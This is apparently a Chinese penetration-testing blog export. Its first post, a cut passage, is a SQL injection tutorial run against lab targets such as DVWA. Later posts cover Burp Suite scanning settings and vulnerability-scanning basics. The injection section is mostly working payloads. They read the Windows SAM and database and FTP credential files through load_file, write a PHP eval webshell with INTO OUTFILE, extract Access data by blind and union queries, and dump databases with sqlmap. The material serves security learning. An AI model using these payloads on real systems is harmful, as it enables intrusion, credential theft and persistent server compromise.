LOAD_FILE(&#39;C:\\BOOT.INI\&#39;),2</code></p><p>显然，在 “php.ini” 配置文件中 magic_quotes_gpc 为 on 或在接受参数的时候用了 addslashes()函数，单引号就会被自动转义成 \ ‘ ，因此函数未能争取执行功能，要绕过此过滤，可将 <code>c:\\boot.ini</code> 转为十六进制：<code>0x633A5C5C626F6F742E696E69</code>，转换后再提交</p><p><code>http://192.168.133.129/dvwa/vulnerabilities/sqli/?id=1%27%20union%20select%201,load_file(0x633A5C5C626F6F742E696E69)+--+&amp;Submit=Submit</code> 或者</p><p><code>http://192.168.133.129/dvwa/vulnerabilities/sqli/?id=1 and 1=2 union select 1,load_file(0x633A5C5C626F6F742E696E69)+--+&amp;Submit=Submit</code></p><p>4）如果想要对服务器进行写操作，直接用下面这条语句进行操作：</p><p><code>http://192.168.133.129/dvwa/vulnerabilities/sqli/?id=1%27%20union%20select%20&#39;568311803&#39;,2 into outfile &#39;c:/muma.txt&#39;+--+&amp;Submit=Submit</code></p><p>写一个一句话木马试试：</p><?php @eval($_POST['chopper']);?><p> 转为十六进制：<code>0x3C3F70687020406576616C28245F504F53545B2763686F70706572275D293B3F3E</code></p><p><code>http://192.168.133.129/dvwa/vulnerabilities/sqli/?id=1%27%20union%20select%200x3C3F70687020406576616C28245F504F53545B2763686F70706572275D293B3F3E,2 into outfile &#39;c:/muma.txt&#39;+--+&amp;Submit=Submit</code></p><p>为什么要把一句话转为十六进制，因为一句话木马中也有单引号，再用单引号会引起混淆。所以得出结论：如果用编码就不要用单引号，用单引号就不要用编码。</p></li></ol>        <h3 id="3-1-6-怎么获取-Web-路径">          <a href="#3-1-6-怎么获取-Web-路径" class="heading-link"><i class="fas fa-link"></i></a>3.1.6. 怎么获取 Web 路径</h3>      <p>不管是 root 权限还是普通用户权限要对服务器进行读写我们需要网站路径才能得到 webshell.</p><ol><li><p>一般可以在变量后面加上单引号，改变参数类型，怎加参数位数等来造成 MySQL 数据库出错，爆出 Web 物理路径。</p></li><li><p>通过扫描器扫 web 服务器遗留文件 php.php，info.php，phpinfo.php，test.php</p></li><li><p>利用搜索引擎来查找 web 目录。搜索引擎有时候会对网站页面进行快照抓取，包括脚本出错页面，因此可以利用搜索引擎查找网站的出错信息，从而获得网站的物理路径。可在 Google 或 百度中搜索 <code>&quot;mysql site:***.com&quot;</code> 或 <code>&quot;warning site:***.com,error site:***.com.cn&quot;</code>等。</p><p>这里使用 <code>&quot;error site:***.com&quot;</code> 关键字进行查询，从搜索结果中得到了网站的物理路径为 “E:\pujing2015”</p></li><li><p>漏洞爆路径，例如通过网站后台查看网站 Web 路径，CC攻击爆路径 等。</p></li><li><p>通过配置文件找到网站路径，在百度里面输入 *** 配置文件，如：IIS6.0 配置文件，可以找到：<code>C:\\windows\\system32\\inetsrv\\MetaBase.xml</code> 和 <code>C:\windows\system32\inetsrv\MetaBase.bin</code> ，这两个配置文件（小技巧：在百度里输入：load_file() 常用敏感信息，就可以找到别人入侵过程中总结的常用敏感文件路径）</p><p><code>http://192.168.133.129/dvwa/vulnerabilities/sqli/?id=1%27%20union%20select%201,load_file(C:\\WINDOWS\\system32\\inetsrv\\MetaBase.xml)+--+&amp;Submit=Submit</code></p><p>然后查看网页的源代码，就可以得到服务器上所有网站的路径。</p></li></ol>        <h3 id="3-1-7-利用-SQL-注入写入-webshell">          <a href="#3-1-7-利用-SQL-注入写入-webshell" class="heading-link"><i class="fas fa-link"></i></a>3.1.7. 利用 SQL 注入写入 webshell</h3>      <p>假设我们通过 phpinfo 文件知道了网站的物理地址，接下来我们通过使用 union select 语句写入 webshell ，写入需要你有写入的权限。</p><p>‘union select 1,’ ‘INTO OUTFILE ‘/var/www/dvwa/cmd.php’+–+   这种反斜杠/本地没测试，大家测试一下，推荐大家用两个反 <code>\\</code> ，例如：</p><p><code>http://192.168.133.129/dvwa/vulnerabilities/sqli/?id=1&#39; union select &quot;&lt;?php @eval($_POST[&#39;chopper];?&gt;&quot;,2 into outfile&quot;c:\\php\\htdocs\\dvwa\\123.php&quot;+--+&amp;Submit=Submit</code></p>        <h2 id="3-2-MySQL-获取-web-路径方法总结">          <a href="#3-2-MySQL-获取-web-路径方法总结" class="heading-link"><i class="fas fa-link"></i></a>3.2. MySQL 获取 web 路径方法总结</h2>      <p>在 MySQL 注入中，利用 load_file()函数读取网页文件源代码时，首先需要获取网站的路径。网站路径可以通过以下几种方法获得。</p>        <h3 id="3-2-1-直接在出错信息中显示-Web-路径">          <a href="#3-2-1-直接在出错信息中显示-Web-路径" class="heading-link"><i class="fas fa-link"></i></a>3.2.1. 直接在出错信息中显示 Web 路径</h3>      <p>在注入点处加单引号，或者修改提交变量类型，让查询语句出错，从出错信息中往往可以爆出网站 Web 物理路径</p>        <h3 id="3-2-2-load-file-char-47-列出-freebsd-目录">          <a href="#3-2-2-load-file-char-47-列出-freebsd-目录" class="heading-link"><i class="fas fa-link"></i></a>3.2.2. load_file(char(47)) 列出 freebsd 目录</h3>      <p>由于 load_file()函数相当于 Linux 系统中的 cat() 函数，在某些 FreeBSD，Sunos 系统中用 “ cat/ “ 命令可以列出根目录。字符 “ / “ 的 ASCII 码是47 ，在 SQL 注入中，可利用 load_file(char(47)) 直接列出 FreeBSD 等 Linux 系统的文件夹目录。</p>        <h3 id="3-2-3-Linux-的-“-etc-passwd”-文件中的工作目录">          <a href="#3-2-3-Linux-的-“-etc-passwd”-文件中的工作目录" class="heading-link"><i class="fas fa-link"></i></a>3.2.3. Linux 的 “/etc/passwd” 文件中的工作目录</h3>              <h3 id="3-2-4-读取-apache-的配置文件-“httpd-conf”-，获取-web-路径">          <a href="#3-2-4-读取-apache-的配置文件-“httpd-conf”-，获取-web-路径" class="heading-link"><i class="fas fa-link"></i></a>3.2.4. 读取 apache 的配置文件 “httpd.conf” ，获取 web 路径</h3>      <p>PHP 网站程序通常都是通过 apache 提供服务的，apache 的配置文件 “httpd.conf” 中包含了网站物理路径，可通过读取该文件获得 Web 路径。</p><p>在 Linux 系统中，可以利用 load_file() 尝试读取以下路径查看 “apache” 配置文件：</p><ol><li>/etc/init.d/apache</li><li>/etc/init.d/apache2</li><li>/etclhttpd/httpd.conf</li><li>/etc/apache/apache.conf</li><li>/etc/apache2/apache2.conf</li><li>/etc/apache/httpd.conf</li><li>/etc/apache2/httpd.conf</li><li>/usr/local/apache/conf/httpd.conf</li><li>/usr/local/apache2/conf/httpd.conf</li><li>/opt/apache/conf/httpd.conf</li><li>/home/apache/httpd.conf</li><li>/etc/apache2/sites-available/default</li></ol><p>主要看管理员把服务器搭建在什么地方，如果是保持默认的话是前两个，比较好找。</p><p>在 Windows 系统中，可以尝试读取以下路径查看 apache 配置文件：</p><ol><li>C:\Program Files\Apache Group\Apache\conf\httpd.conf</li><li>C:\Program Files\Apache Group\Apache2\conf\httpd.conf</li><li>C:\Program Files\Apache Software Foundation\Apache2.2\conf\httpd.conf</li><li>C:\apache\confthttpd.conf</li></ol><p>也可将C盘换成 D,E,F 盘进行尝试。</p>        <h3 id="3-2-5-利用-load-file-读取各种配置文件">          <a href="#3-2-5-利用-load-file-读取各种配置文件" class="heading-link"><i class="fas fa-link"></i></a>3.2.5. 利用 load_file() 读取各种配置文件</h3>      <p>在 MySQL 注入中，load_file() 函数除了用于读取网页脚本程序源代码外，我们还可以用来读取其他各种敏感的配置文件，方便获得 WebShell 或进行提权。</p><ol><li><p>load_file() 读取服务器配置文件</p><p>在前面讲解了利用 load_file() 函数读取 “apache” 配置文件，从而获得 Web 物理路径外，还可以利用此函数读取网站中的其他的重要的配置文件，获得更多敏感信息。</p><p>/usr/local/app/apache2/conf/extra/http-vhosts.conf        虚拟网站设置</p><p>/usr/local/app/php5/lib/php.ini        php相关设置</p><p>/etc/sysconfig/iptables         防火墙规则策略</p><p>/etc/rsyncd.conf            同步程序配置</p><p>/etc/sysconfig/network-script/ifcfg-eth0           查看IP</p><p>/etc/redhat-release             系统版本</p><p>/etc/issue             系统版本</p><p>/etc/issue.net                系统版本</p><p>/usr/local/resin/conf/resin.conf               查看 Linux 系统配置的 JSP 虚拟主机</p><p>/usr/local/resin-pro-3.0.22/conf/resin.conf           查看 RESIN 3.0.22 配置文件</p><p>/usr/local/resin-3.0.22/conf/resin.conf           查看 RESIN 3.0.22 配置文件</p><p>c:\mysql\data\mysql\user.MYD              存储了”mysql.user”表中的数据库链接密码</p><p>c:\program files\rhinosoft.com\serv-u\servudaemon.ini             FTP 软件配置文件，存储虚拟主机网站路径和密码</p><p>c:\program files\serv-u\servudaemon.ini             FTP 软件配置文件，存储虚拟主机网站路径和密码</p><p>c:\program files\mysql\my.ini                Mysql 配置文件</p><p>c:\windows\my.ini                Mysql 配置文件</p><p>c:\windows\system32\inetsrv\metabase.xml              IIS 配置文件</p><p>c:\resin\conf\conf\resin.conf                查看 JSP 网站 “resin” 文件配置信息</p><p>c:\resin-3.0.14\conf\conf\resin.conf                查看 JSP 网站 “resin” 文件配置信息</p></li><li><p>load_file() 读取二进制文件</p><p>除了读取文本类型的文件外，load_file() 还可以用来读取系统中的二进制文件，例如个各种密码存储在配置文件中。</p><p>c:\windows\repair\sam               windows 系统初次安装时的密码</p><p>c:\program files\serv-u\servuadmin.exe                   serv-U 6.0 及之前版本的管理员密码文件</p><p>c:\documents and setting\all users\application data\symantec\pcanywhere*.cif                  pcanywhere 登录密码文件</p><p>只要 MySQL 注入点处的账号权限足够，那么 load_file() 函数就可以读取任何文件。但是需要注意的是，由于浏览器编码不能完全显示二进制编码文件，因此需要使用 hex() 函数将 load_file() 函数读出的二进制文件转为十六进制显示在网页上。在将网页中显示的十进制代码复制到本地后，通过转换成二进制文件才能加以利用。</p></li><li><p>load_file() 函数读取文件时不可忽视的问题</p><p>在上一个案例中，读取网页源代码时在网页中未能正常显示一些代码内容，这是由于网页源代码中包含一些特殊的字符，如：“&gt;”,“&lt;” 之类的，因此导致在返回源代码内容时显示为了网页效果，而不是真实的代码内容。因此，除了通过查看源代码外，还可以考虑在返回代码时替换一些特殊的字符，从而令网页中正常显示源文件代码内容。（&lt;:60   &gt;:62)</p><p>可在 load_file()函数使用时调用如下形式：</p><p>replace(load_file(char(文件路径十六进制代码)),char(60),char(32))  ：这句话代码的意思是，将返回文件内容中的 “&lt;” 替换成了空格，这样就可以屏蔽网页效果，而查看到真实的网页内容了。</p><p>例如，在上一个案例中，采用替换字符的方式读取文件，提交如下链接：</p><p><code>http://192.168.133.129/dvwa/vulnerabilities/sqli/?id=1%27%20union%20select replace(load_file(文件路径十六进制形式),char(60),char(32)),2+--+&amp;Submit=Submit</code></p><p>页面中返回的就是源代码内容，而不再显示网页形式了。</p></li></ol>        <h1 id="二，Access-数据库注入攻击基本技术">          <a href="#二，Access-数据库注入攻击基本技术" class="heading-link"><i class="fas fa-link"></i></a>二，Access 数据库注入攻击基本技术</h1>      <p>Access 注入攻击针对于那些小网站搭建的，访问流量小的。</p>        <h2 id="4-1-爆出数据库类型">          <a href="#4-1-爆出数据库类型" class="heading-link"><i class="fas fa-link"></i></a>4.1 .爆出数据库类型</h2>      <p>SQL server 有一些系统变量和系统表，如果服务器 IIS 提示没有关闭，并且 SQL server 返回错误提示的话，可以直接从出错信息中获取判断数据库的类型（后面会详细讲解如何突破 IIS 提示被关闭）</p>        <h3 id="4-1-1-内置变量爆数据库类型">          <a href="#4-1-1-内置变量爆数据库类型" class="heading-link"><i class="fas fa-link"></i></a>4.1.1. 内置变量爆数据库类型</h3>      <p>‘User’ 是 SQL server 的一个内置变量，它的值是当前连接的用户名，其变量类型为 “nvarchar” 字符型，通过提交查询该变量，根据返回的错误信息即可得知数据库类型，方法是在注入点之后提交如下语句：</p><p>and user&gt;0</p><p>该查询会将 user 对应的 nvarchar 型值与 int 数字型的0对比，两个数据类型不一致，因此会返回错误信息。</p><p>如果提示如下错误信息：</p><p>Mircrosoft OLE DB Provider for SQL server 错误 ‘80040e21’</p><p>将 nvarchar 值 ‘****’ 转换为 int 列时发生语法错误。</p><p>/home/yz/yu/show.asp</p><p>则可以判断时 MS SQL 数据库。如果采取的是 Access 数据库的话，那么提示信息则会如下显示：</p><p>Server Error in ‘/‘ Application    在将 nvarchar 值 转换成数据类型 int 时失败</p>        <h3 id="4-1-2-内置数据表爆数据库类型">          <a href="#4-1-2-内置数据表爆数据库类型" class="heading-link"><i class="fas fa-link"></i></a>4.1.2. 内置数据表爆数据库类型</h3>      <p>如果服务器 IIS 不允许返回错误提示，通常可以通过数据库内置的系统数据表来进行判断。在注入点提交如下查询语句：</p><p>and (select count(*) from sysobjects)&gt;=0</p><p>and (select count(*) from msysobjects)&gt;=0</p><p>Access 存在系统表[msysobjects]，不存在 “sysobjects” 表。因此如果数据库采用的是 Access ，会返回如下提示错误信息：</p><p>Mircrosoft OLE DB Provider for ODBC Drivers 错误 ‘80040e37’</p><p>/home/yz/yu/show.asp，行8</p><p><code>[Microsoft][ODBC Microsoft Access Driver]Microsoft Jet</code>数据库引擎找不到输入表或查询 “sysobjects” 。确认它是否存在，以及它的名称的拼写是否正确。</p><p>在 MS SQL Server：存在系统表 [sysobjects]，不存在[msysobjects]系统表，因此会返回如下错误提示信息：</p><p>Server Error in ‘/‘ Application</p><p>系统表 ‘O’ 无效            #存在系统表 [sysobjects]</p><p>系统表 ‘msysobjects’ 无效                 #不存在[msysobjects]</p>        <h2 id="4-2-猜测数据库名">          <a href="#4-2-猜测数据库名" class="heading-link"><i class="fas fa-link"></i></a>4.2.猜测数据库名</h2>      <p>可在注入点后提交如下语句进行查询：</p><p>and exists(select * from 数据库表名)       或者</p><p>and (select count(*) from 数据库表名)&gt;=0</p><p>上面的语句是判断数据库中是否存在指定数据库表名。如果页面返回出错，那么可更替其他常见数据库表名继续进行查询，</p>        <h2 id="4-3-猜测字段名及字段长度">          <a href="#4-3-猜测字段名及字段长度" class="heading-link"><i class="fas fa-link"></i></a>4.3. 猜测字段名及字段长度</h2>      <p>可在注入点提交如下语句查询：</p><p>and exists(select 字段名 from 数据库表名)     或者</p><p>and (select count(字段名) from 数据库表名 )&gt;=0</p><p>如果存在此字段名，返回页面正常，否则可更换字段名继续进行猜测。</p><p>猜解字段长度，可提交如下查询语句：</p><p>当提交 &gt;n-1 时正常，而提交 &gt;n 时返回错误，则说明字段长度为 n。</p><p>and (select top 1 len(字段名) from 数据库表名)&gt;1</p><p>…</p><p>and (select top 1 len(字段名) from 数据库表名)&gt;n-1</p><p>and (select top 1 len(字段名) from 数据库表名)&gt;n</p><p>当提交 &gt;n-1 时正常，而提交到 n 时返回错误，那么说明字段长度为 n。</p>        <h3 id="4-1-4-猜字段值">          <a href="#4-1-4-猜字段值" class="heading-link"><i class="fas fa-link"></i></a>4.1.4. 猜字段值</h3>      <p>猜字段的 ASCII 值，可在注入点后提交如下查询语句：</p><p>and (select top 1 asc(mid(字段名,1,1)) from 数据库表名)&gt;0</p><p>…</p><p>and (select top 1 asc(mid(字段名,1,1)) from 数据库表名)&gt;n-1</p><p>and (select top 1 asc(mid(字段名,1,1)) from 数据库表名)&gt;n</p><p>当提交 &gt;n-1 时正常，而提交 &gt;n 时返回出错，那么说明字段值的 ASCII 码为 n。反查 ASCII 码对应的字符，就可以得到字段值的第一位字符，要继续提交如下查询：</p><p>and (select top 1 asc(mid(字段名,2,1)) from 数据库表名)&gt;0</p><p>用上面同样的方法，可以得到第二位字符。在继续进行查询，直接猜解出字段的所有字符值为止。</p>        <h2 id="4-4-SQL-注入的高级查询">          <a href="#4-4-SQL-注入的高级查询" class="heading-link"><i class="fas fa-link"></i></a>4.4. SQL 注入的高级查询</h2>      <p>在上一节介绍的 ASCII 码猜解法很浪费时间，下面介绍一种高效的方法 order by 与 union select 联合查询，可以快速地获取字段长度和字段内容。这种查询方法，不仅可以利用在 Access 数据库猜解中，必须掌握的方法。同样可以适用于利用在其他类型的数据库的注入猜解中。</p>        <h3 id="4-4-1-order-by-猜字段数目">          <a href="#4-4-1-order-by-猜字段数目" class="heading-link"><i class="fas fa-link"></i></a>4.4.1. order by 猜字段数目</h3>      <p>首先，利用 order by 猜解字段数目，查询语句如下：</p><p>order by 1</p><p>order by 2</p><p>….</p><p>order by n-1</p><p>order by n</p><p>如果 n-1 时返回正常，n 时返回错误，那么说明数据库字段数目为 n-1。</p>        <h3 id="4-4-2-union-select-爆字段内容">          <a href="#4-4-2-union-select-爆字段内容" class="heading-link"><i class="fas fa-link"></i></a>4.4.2. union select 爆字段内容</h3>      <p>得到字段长度后，就可以利用 union select 查询获得字段内容了。</p><p>and 1=2 union select 1,2,3…,n from 表名</p><p>执行上面的查询时，在页面会返回数字，修改查询语句中的数字为字段名，例如提交如下代码：</p><p>and 1=2 union select 1,字段1,字段2…,n from 表名</p><p>在页面中就会返回字段内容，不必一个个进行猜解了。</p>        <h2 id="5-1-偏移注入">          <a href="#5-1-偏移注入" class="heading-link"><i class="fas fa-link"></i></a>5.1. 偏移注入</h2>      <p>偏移注入是针对 Access 数据库，当我们注入猜到数据库表名却猜不到列名 (字段名) 的情况下，这种方法就可以帮我填补。（注：这种方法运气很重要）</p>        <h2 id="5-2-跨库注入">          <a href="#5-2-跨库注入" class="heading-link"><i class="fas fa-link"></i></a>5.2. 跨库注入</h2>      <p>假设 a 和 b 两个站点在同一台服务器上，但是服务器上面安装了 安全狗，waf 这样的安全软件，现在我们要对 a 站点进行攻击，但是没有发现什么大漏洞，只找到网站数据库路径，对数据库下载发现下载不了。这个时候我发现 b 站点有注入点。直接用：</p><p><span class="exturl"><a class="exturl__link" href="http://192.168.133.133:83/new_view.asp?id=14">http://192.168.133.133:83/new_view.asp?id=14</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> union select 1,adminpassword,username,4,5,6,7 from [C:\wwwtest\2AspCMS_data\data.asp].Aspcms_Admins</p><p>[C:\wwwtest\2AspCMS_data\data.asp].Aspcms_Admin 是 b 站点的数据库路径</p>        <h1 id="三，注入之伪静态突破">          <a href="#三，注入之伪静态突破" class="heading-link"><i class="fas fa-link"></i></a>三，注入之伪静态突破</h1>      <p>phpstudy 配置伪静态</p>        <h1 id="四，sqlmap-自动化注入">          <a href="#四，sqlmap-自动化注入" class="heading-link"><i class="fas fa-link"></i></a>四，sqlmap 自动化注入</h1>              <h2 id="6-1-sqlmap-基本命令">          <a href="#6-1-sqlmap-基本命令" class="heading-link"><i class="fas fa-link"></i></a>6.1. sqlmap 基本命令</h2>      <p>#-u 目标网址<br>#–batch 自动化<br>#–dbs数据库<br>#–users 获取所有用户<br>#–current-db  当前数据库<br>#–current-user  当前用户<br>#-D 库名 –tables  指定库下面的表信息<br>#-T 表名 –columns 指定表下面的列信息(前面要有指定的库）<br>#-C 列名 指定列名下的数据<br>#–dump 把想要的down下来（在想要的库或表的后面添加的语句）</p><p>sqlmap.py -u “<span class="exturl"><a class="exturl__link" href="http://192.168.133.133:81/pikachu/vul/sqli/sqli_str.php?name=vince&amp;submit=%E6%9F%A5%E8%AF%A2&quot;">http://192.168.133.133:81/pikachu/vul/sqli/sqli_str.php?name=vince&amp;submit=%E6%9F%A5%E8%AF%A2&quot;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> –batch –dbs –level 2</p><p>sqlmap.py -u “<span class="exturl"><a class="exturl__link" href="http://192.168.133.133:81/pikachu/vul/sqli/sqli_str.php?name=vince&amp;submit=%E6%9F%A5%E8%AF%A2&quot;">http://192.168.133.133:81/pikachu/vul/sqli/sqli_str.php?name=vince&amp;submit=%E6%9F%A5%E8%AF%A2&quot;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> –batch -D dvwa –tables</p><p>……</p>]]></content>
      
      
      <categories>
          
          <category> Web渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>漏洞扫描类 Burpsuite</title>
      <link href="2020/07/25/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E7%B1%BB%20Burpsuite/"/>
      <url>2020/07/25/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E7%B1%BB%20Burpsuite/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>        <h1 id="漏洞扫描类-Burpsuite">          <a href="#漏洞扫描类-Burpsuite" class="heading-link"><i class="fas fa-link"></i></a>漏洞扫描类 Burpsuite</h1>              <h2 id="1-1-功能介绍">          <a href="#1-1-功能介绍" class="heading-link"><i class="fas fa-link"></i></a>1.1. 功能介绍</h2>      <p>Burpsuite 是 Web 应用程序测试的最佳工具之一，其多种功能帮我们执行各种任务，请求的拦截和修改，扫描 Web 应用程序漏洞，以暴力破解登录表单，执行会话令牌等多种的随机性检查。</p><a id="more"></a><p>特征：先爬取再检测是否有漏洞</p>        <h2 id="1-2-部署指南">          <a href="#1-2-部署指南" class="heading-link"><i class="fas fa-link"></i></a>1.2. 部署指南</h2>      <p>Java 运行环境 + Burpsuite 安装包</p>        <h2 id="1-3-实战">          <a href="#1-3-实战" class="heading-link"><i class="fas fa-link"></i></a>1.3. 实战</h2>      <p>由于 Burpsuite 功能强大，各项参数复杂，下面我们只看重于软件的主要功能，</p>        <h3 id="1-3-1-New-Scan-新建扫描">          <a href="#1-3-1-New-Scan-新建扫描" class="heading-link"><i class="fas fa-link"></i></a>1.3.1. New Scan(新建扫描)</h3>      <ol><li><p>Scan details：扫描细节</p><p>scan type:crawl and audit(爬行并审计)</p><p>url to scan：<span class="exturl"><a class="exturl__link" href="https://www.oldboyedu.com/">https://www.oldboyedu.com</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p>1）details scope configuration：详细的范围设置</p><p>included url prefixes：包含 url 前缀</p><p>exclude url prefixes：排除 url 前缀</p><p>2）use advanced scope control：高级范围设置</p><p>included urls：包含的网址</p><p>excluded urls：排除的网址</p><p>3）protocol：协议（any,https,http)</p></li><li><p>Scan configuration：扫描设置（参考默认配置）</p><p>new crawling/auditing：爬行/审计</p><p>1）crawl optimization：抓取优化（maximum link depth 最大链接深度，几级网站目录；crawl strategy 爬行策略，速度）</p><p>2）crawl limits：抓取限制（maximum crawl time 最大抓取时间，超过这个时间就会自动终止）</p><p>3）login functions：登录功能（attempt to self-register a user 尝试自行注册简单网址用户；trigger login ..(use invalid username) 登录失败，使用非法用户</p><p>4）handling application errors crawl：处理爬网期间的应用程序错误（连续错误超时，跳过该扫描）</p><p>5）miscellaneous：其他</p></li><li><p>application login：用户注册（有些网站扫描时要输入用户名和密码，用来扫后台的模块 label标签）</p></li><li><p>resource pool：资源池</p></li></ol>        <h3 id="1-3-2-New-live-task-实时任务">          <a href="#1-3-2-New-live-task-实时任务" class="heading-link"><i class="fas fa-link"></i></a>1.3.2. New live task(实时任务)</h3>      <p><strong>Scan details</strong></p><p>live audit:</p><ol><li>choose predefine task：自定义任务</li><li>passive scan through proxy：使用代理被动扫描</li><li>active scan through proxy：使用代理主动扫描</li></ol><p>url scope：网址范围</p><p>deduplication：重复排除</p><p><strong>Scan configuration：扫描设置</strong>（保持默认）</p><ol><li>audit optimization：审计优化</li><li>lssues reported：要报告的问题</li><li>handing application errors furing audit：在诊断期间处理应用错误</li><li>insertion point type：插入点类型</li><li>modifying parameter locations：操作参数位置</li><li>ignored insertion points：忽略插入点（可跳过的服务端插入的位置）</li><li>frequently occrurring insertion points：经常插入点</li><li>misc insertion point options：其他插入点</li><li>javascript analysis：js解析</li></ol>        <h3 id="1-3-3-Undock">          <a href="#1-3-3-Undock" class="heading-link"><i class="fas fa-link"></i></a>1.3.3. Undock</h3>      <p>可以单独把区域页面放大拿出来</p>        <h3 id="1-4-Target">          <a href="#1-4-Target" class="heading-link"><i class="fas fa-link"></i></a>1.4. Target</h3>      <ol><li><p>site map：显示扫描的结果</p></li><li><p>filter：筛选，剔除筛选标准</p></li><li><p>scope：范围</p><p>1）include in scope：包含的范围</p><p>2）exclude from scope：剔除的IP网址，有些企业会对扫描结果进行垃圾存储</p><p>3）issue definitions：问题定义，扫描的漏洞库</p></li></ol>        <h3 id="1-5-Proxy-代理">          <a href="#1-5-Proxy-代理" class="heading-link"><i class="fas fa-link"></i></a>1.5. Proxy(代理)</h3>      <p>相关参考：<span class="exturl"><a class="exturl__link" href="https://blog.csdn.net/weixin_45798017/article/details/105151456">https://blog.csdn.net/weixin_45798017/article/details/105151456</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 或者 <span class="exturl"><a class="exturl__link" href="https://blog.csdn.net/weixin_45798017/article/details/105255856">https://blog.csdn.net/weixin_45798017/article/details/105255856</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>        <h3 id="1-6-Intruder-入侵">          <a href="#1-6-Intruder-入侵" class="heading-link"><i class="fas fa-link"></i></a>1.6. Intruder(入侵)</h3>      <ol><li><p>Target：代理拦截后会自动识别</p></li><li><p>Positions：</p><p>auto：有参数的地方自动添加变量</p><p>refresh：刷新</p></li><li><p>Payloads：定义参数值和类型</p><p>payload set：参数值</p><p>payload type：类型（可以是numbers，下面就有相关的设置）</p><p>payload 也可自定以添加（simple lists）</p><p>intruder-&gt;start attack(开始攻击)</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> Web渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞扫描 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>漏洞扫描技术</title>
      <link href="2020/07/19/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E6%8A%80%E6%9C%AF/"/>
      <url>2020/07/19/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E6%8A%80%E6%9C%AF/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>        <h1 id="一，漏洞扫描技术">          <a href="#一，漏洞扫描技术" class="heading-link"><i class="fas fa-link"></i></a>一，漏洞扫描技术</h1>              <h2 id="1-1扫描原理">          <a href="#1-1扫描原理" class="heading-link"><i class="fas fa-link"></i></a>1.1扫描原理</h2>              <h3 id="1-1-1-Ping-检测">          <a href="#1-1-1-Ping-检测" class="heading-link"><i class="fas fa-link"></i></a>1.1.1. Ping 检测</h3>      <p>win+R -&gt; cmd -&gt; ping + 目标IP</p><p>当 ping 通目标 IP 后 返回 TTL值判断目标 IP 的操作系统</p><a id="more"></a><p>TTL=128：可能是 windows xp/2000/2003 系统</p><p>TTL=64：可能是 windows 7/2008/10 系统，Linux系统</p><p>TTL=255：可能是交换机，路由器设备</p>        <h3 id="1-1-2-端口扫描">          <a href="#1-1-2-端口扫描" class="heading-link"><i class="fas fa-link"></i></a>1.1.2. 端口扫描</h3>      <p>win+R -&gt; cmd -&gt; telnet + 目标IP + 目标端口号</p><p>注意：扫描器的运作是基于 TCP/IP 的，个人计算机，服务器主机或者防火墙和路由器都适用。扫描信息的来源基本都必须依赖于端口，即必须某端口对外开放，才可以以此判断主机上运行的操作系统，服务软件类型及版本等。例如：使用 ftp.exe 连接主机，判断主机 FTP 服务程序类型和版本，如果 FTP 服务对应的 21 端口无法访问，则得不到任何信息。</p>        <h2 id="1-2-扫描分类">          <a href="#1-2-扫描分类" class="heading-link"><i class="fas fa-link"></i></a>1.2. 扫描分类</h2>      <ol><li>开放扫描：</li><li>半开放扫描：</li><li>隐蔽扫描：</li><li>扫射扫描：</li><li>其他扫描：</li></ol>        <h2 id="1-3-扫描前准备">          <a href="#1-3-扫描前准备" class="heading-link"><i class="fas fa-link"></i></a>1.3.扫描前准备</h2>      <ol><li>了解网络的部署情况，企业的 需要/不需要/不能 扫描（有些扫描可能造成网络瘫痪）</li><li>扫描时间和方式（正常来说都是在凌晨，半夜进行扫描，这个时间段访问的用户比较少）</li><li>定制好扫描策略（针对于 漏洞/端口/弱口令/全部 扫描）</li><li>防火墙是否开启（防火墙开启的情况下，默认是扫描不到的）</li><li>企业服务是否配置了相关的安全策略，以访锁死（注意）（比如说：数据库设置3次密码，针对那些弱口令的暴力破解）</li></ol>        <h2 id="1-4-常见的扫描工具">          <a href="#1-4-常见的扫描工具" class="heading-link"><i class="fas fa-link"></i></a>1.4. 常见的扫描工具</h2>      <ol><li>SuperScan</li><li>Fluxay（流光）</li><li>X-Scan</li><li>MBSA</li><li>Wikto</li><li>NMAP</li><li>天镜（启明）</li><li>极光（绿盟）</li></ol><p>国外：Arachni（开源的，kali中自带），HP WebInspect，IBM AppScan，Acunetix WVS（AWVS），Nessus，Nexpose，Netspaker…</p><p>国内：绿盟科技，杭州安恒，知道创宇，启明星辰…</p>        <h2 id="1-5-X-scan-的简写使用">          <a href="#1-5-X-scan-的简写使用" class="heading-link"><i class="fas fa-link"></i></a>1.5. X-scan 的简写使用</h2>      <ol><li><p>设置—&gt;扫描参数</p><p>这里可以设置 扫描目标 IP 或者网段</p><p>或者把要扫描的目标网址或者IP放到记事本里，通过”从文件获取主机列表”进行扫描</p><p>1）全局设置</p><p>扫描模块：一般默认，但是想怎么扫就勾上要扫的模块</p><p>并发扫描：根据自己电脑性能来决定并发扫描数量</p><p>扫描报告：一般采用网页报告就是 HTML 格式的（选择扫描完自动生成扫描列表）</p><p>2）其他设置</p><p>跳过没有响应的主机：默认的一般是这个，扫描比较快（方式：ping/telent）</p><p>无条件扫描：不管主机是否禁止，这种扫描比较慢</p><p>3）插件设置</p><p>字典文件设置：默认字典都比较弱，可以自己编辑添加，这都在 dat 